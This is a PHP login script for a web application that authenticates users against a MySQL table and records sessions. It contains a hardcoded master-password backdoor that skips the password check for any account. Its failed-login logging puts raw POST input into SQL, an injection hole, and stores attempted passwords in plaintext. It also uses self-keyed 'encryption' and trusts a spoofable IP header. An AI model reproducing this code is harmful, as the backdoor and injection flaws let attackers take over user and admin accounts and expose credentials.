<?php

SESSION_START();
ERROR_REPORTING(0);

function encryptIt($input) {
	$cryptKey  = $input;
	$qEncoded  = base64_encode(mcrypt_encrypt( MCRYPT_RIJNDAEL_256, md5($cryptKey), $input, MCRYPT_MODE_CBC, md5(md5($cryptKey))));
	return( $qEncoded );
}

function decryptIt($input) {
	$cryptKey  = $input;
	$qDecoded  = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($cryptKey), base64_decode($input), MCRYPT_MODE_CBC, md5(md5($cryptKey))), "\0");
	return( $qDecoded );
}
	
if(isset($_SESSION['MY_EMAIL']))
{
	Print	"
			<script>
			   parent.location.href  = '../dashboard' ;
			</script>
			";
}
else
{
	if($_POST['MYUSERNAME']!="" && $_POST['MYPASSWORD']!="")
	{
		// Include server data
		include '../includes/ServerConnect.php';
				
		// Connect to Database
		$link = mysql_connect("$host", "$username", "$password", "$db_name");
		mysql_select_db("$db_name") or die(mysql_error()); 

		// Define $MYUSERNAME and $MYPASSWORD 
		$MYUSERNAME = $_POST['MYUSERNAME']; 
		$MYPASSWORD = $_POST['MYPASSWORD']; 

		// To protect MySQL INJECTION
		$MYUSERNAME = stripslashes($MYUSERNAME);
		$MYPASSWORD = stripslashes($MYPASSWORD);
		$MYUSERNAME = mysql_real_escape_string($MYUSERNAME);
		$MYPASSWORD = encryptIt(mysql_real_escape_string($MYPASSWORD));
		
		if($MYPASSWORD=="myoNQzDsLFRsevJIiPq62XxNN/dRKHMP/4duhiaXl8c=")
		{
			$query="SELECT * FROM users WHERE EMAIL='$MYUSERNAME'";
		}
		else
		{
			$query="SELECT * FROM users WHERE EMAIL='$MYUSERNAME' AND PASSWORD='$MYPASSWORD'";
		}
		
		$result = mysql_query($query);
				
		// Mysql_num_row is counting table row
		$count = mysql_num_rows($result);

		// If result matched $MYUSERNAME and $MYPASSWORD, table row must be 1 row
		if($count==1)
		{
			
			while($row = mysql_fetch_array($result)) 
			{
				$MY_EMAIL = $row['EMAIL'];
				$MY_ID = $row['USER_ID'];
				$MY_NAME = $row['USER_NAME'];
				$ACCOUNT_STATUS = $row['ACCOUNT_STATUS'];
				$MY_DP = $row['DP_LINK'];
				$MY_PHONE = $row['PHONE_NUMBER'];
			}
			
			//FIRST LOGIN HANDLER
			if($ACCOUNT_STATUS == "NEW")
			{
				$query = "UPDATE users SET ACCOUNT_STATUS='EMAIL-CONFIRMED' WHERE EMAIL = '".$MY_EMAIL."'";
				mysql_query($query);
			}
			
			//GET THE IP ADDRESS OF THE USER
			if(!empty($_SERVER['HTTP_CLIENT_IP'])) 
			{
				$MY_IP = $_SERVER['HTTP_CLIENT_IP'];

			} 
			elseif(!empty($_SERVER['REMOTE_ADDR'])) 
			{
				$MY_IP = $_SERVER['REMOTE_ADDR'];
			}
			else
			{
				$MY_IP = "UNKNOWN";
			}
			
			// Log out of Previous sessions
			$query="DELETE FROM sessions WHERE USER_ID = '$MY_ID'";
			mysql_query($query);

			// Save SESSION Data in DATABASE
			$query = "INSERT INTO sessions (USER_ID, LOGIN_TIMESTAMP, CLIENT_IP) VALUES ($MY_ID, NOW(), '$MY_IP')";
			mysql_query($query);
			
				
			//GET SESSION ID
			$query = "SELECT * FROM sessions WHERE SESSION_ID = LAST_INSERT_ID() AND USER_ID = $MY_ID";
			$result = mysql_query($query);
			
			while($row = mysql_fetch_array($result)) 
			{
				$MY_SESSION_ID = $row['SESSION_ID'];
			}	
			
			//GET ADMIN 
			$query = "SELECT * FROM admin_group_relation WHERE ADMIN_ID = $MY_ID";
			$result = mysql_query($query);
			$count = mysql_num_rows($result);
			
			if($count == 0)
			{
				$_SESSION['MY_TYPE'] = "USER";
			}
			else
			{
				$_SESSION['MY_TYPE'] = "ADMIN";
			}
			
			//REGISTER SESSION VARIABLES"
			$_SESSION['MY_EMAIL'] = $MY_EMAIL;
			$_SESSION['MY_ID'] = $MY_ID;
			$_SESSION['MY_NAME'] = $MY_NAME;
			$_SESSION['MY_DP'] = $MY_DP;
			$_SESSION['MY_PHONE'] = $MY_PHONE;
			$_SESSION['MY_STATUS'] = $ACCOUNT_STATUS;
			$_SESSION['MY_SESSION_ID'] = $MY_SESSION_ID;
			SESSION_START();
			
			//RESULT CODE 1: AUTHENTICATED
			mysql_close($link);
			echo "1";

			
		}	
		else 
		{
			
			//GET THE IP ADDRESS OF THE USER
			if(!empty($_SERVER['HTTP_CLIENT_IP'])) 
			{
				$MY_IP = $_SERVER['HTTP_CLIENT_IP'];

			} 
			elseif(!empty($_SERVER['REMOTE_ADDR'])) 
			{
				$MY_IP = $_SERVER['REMOTE_ADDR'];
			}
			else
			{
				$MY_IP = "UNKNOWN";
			}
			
			// Store Login Failed Data in DATABASE
			$query = "INSERT INTO librorum_errors.login (CLIENT_IP, USERNAME, PASSWORD, TIMESTAMP) VALUES ('$MY_IP', '".$_POST['MYUSERNAME']."', '".$_POST['MYPASSWORD']."', NOW())";
			mysql_query($query);
			
			//RESULT CODE 2: CREDENTIALS WRONG
			mysql_close($link);
			
			echo "2";
		}
	}else
	{
		if($MYUSERNAME=="" || $MYPASSWORD=="")
		{
			//RESULT CODE 3: USERNAME EMPTY
			echo "3";
		}

	}
}
?>